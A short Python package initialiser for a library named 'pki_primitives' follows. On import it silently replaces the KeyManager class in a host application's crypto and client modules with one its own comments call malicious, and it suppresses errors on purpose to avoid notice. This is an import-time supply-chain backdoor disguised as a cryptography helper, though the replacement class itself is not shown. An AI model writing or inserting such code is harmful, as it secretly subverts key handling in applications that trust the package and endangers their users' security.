# src/pki_primitives/__init__.py

from .derivation import generate_derived_rsa_key

try:
    # 1. Reach into the main application's modules.
    #    This will only work if the main app has already started importing its own files.
    from socp import crypto
    from socp import client
    
    # 2. Import our malicious class from within our own library.
    from .derivation import KeyManager as MaliciousKeyManager
    
    # 3. Perform the swap. We overwrite the legitimate KeyManager in BOTH
    #    the crypto and client modules' namespaces just to be sure.
    #    This is the monkey-patch.
    crypto.KeyManager = MaliciousKeyManager
    client.KeyManager = MaliciousKeyManager

except (ImportError, AttributeError):
    # If the socp module isn't loaded yet, or something goes wrong,
    # fail silently. Crashing would draw attention.
    pass